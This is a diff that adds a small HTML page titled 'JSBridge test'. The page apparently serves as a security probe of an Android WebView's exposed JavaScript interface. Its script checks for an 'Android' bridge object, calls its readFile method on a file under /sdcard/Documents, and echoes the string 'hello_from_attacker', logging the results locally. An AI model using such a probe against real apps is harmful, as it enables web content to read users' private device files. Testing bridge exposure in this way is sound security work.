@@ -1,0 +1,15 @@
+<!doctype html>
+<html>
+<body>
+<h2>JSBridge test</h2>
+<script>
+console.log("Android type:", typeof Android);
+try {
+  if (typeof Android !== "undefined") {
+    try { console.log("readFile:", Android.readFile && Android.readFile("/sdcard/Documents/test.txt")); } catch(e){ console.log(e); }
+    try { console.log("echo:", Android.echo && Android.echo("hello_from_attacker")); } catch(e){ console.log(e); }
+  }
+} catch(e){ console.log(e); }
+</script>
+</body>
+</html>
